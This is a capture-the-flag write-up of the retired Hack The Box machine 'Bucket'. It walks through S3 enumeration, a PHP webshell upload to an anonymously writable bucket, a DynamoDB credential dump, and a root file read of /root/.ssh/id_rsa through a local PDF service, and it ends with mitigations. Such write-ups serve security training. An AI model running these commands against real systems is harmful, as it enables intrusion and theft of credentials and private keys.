---
machine: Bucket
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, aws, s3, dynamodb, pdf, privesc]
---

# Bucket — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

The site is served from a writable S3 bucket. Upload a PHP webshell for execution; DynamoDB leaks the `management` password. From that account, a localhost PDF service reads files as root and turns file read into a shell.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- Ports: `22/tcp` SSH and `80/tcp` HTTP.
- Services: Web server plus endpoints simulating AWS S3 and DynamoDB.
- Technologies: AWS CLI, S3, DynamoDB, PHP and a localhost PDF service.

## Enumeration

- `bucket.htb` and the `s3.bucket.htb` endpoint.
- `adserver` bucket with anonymous write access.
- DynamoDB `users` table containing credentials.
- PDF service bound to `127.0.0.1`.

## Foothold

Enumerate S3 with the CLI, upload a PHP file to the bucket backing the vhost and request its public path. The shell runs as the web user; DynamoDB provides the `management` password for SSH.

```bash
aws --endpoint-url http://s3.bucket.htb s3 ls
aws --endpoint-url http://s3.bucket.htb s3 cp shell.php s3://adserver/shell.php
curl http://bucket.htb/shell.php
aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users
ssh management@bucket.htb
```

## Lateral movement

The DynamoDB password is reused for SSH; the next hop is the local PDF service, not another host.

## Privilege escalation

The PDF generator accepts a user-controlled location and runs as root. Use it to read privileged files, then to write a key or execute a command.

```bash
ss -lntp
curl http://127.0.0.1:<PORT>/
# Read a file as root and turn it into access:
curl "http://127.0.0.1:<PORT>/?url=file:///root/.ssh/id_rsa"
```

## Evidence

- Listing and writing to the `adserver` bucket.
- Webshell reachable through the vhost.
- `management` password and PDF service output.

## Lessons learned

- Cloud-like endpoints keep the same permission pitfalls.
- A writable bucket serving code is direct RCE.
- Internal services often run with more privilege than the exposed app.

## Mitigation and detection

- Block anonymous writes and serve static files from a non-executable bucket.
- Remove DynamoDB credentials from code and rotate them.
- Run the PDF generator unprivileged and validate paths and URLs.

## References

- [0xdf — Bucket](https://0xdf.gitlab.io/2021/04/24/htb-bucket.html)
- [IppSec — Bucket](https://www.youtube.com/watch?v=SgWhuTxm2oY)
- [Hack The Box — Bucket](https://app.hackthebox.com/machines/bucket)
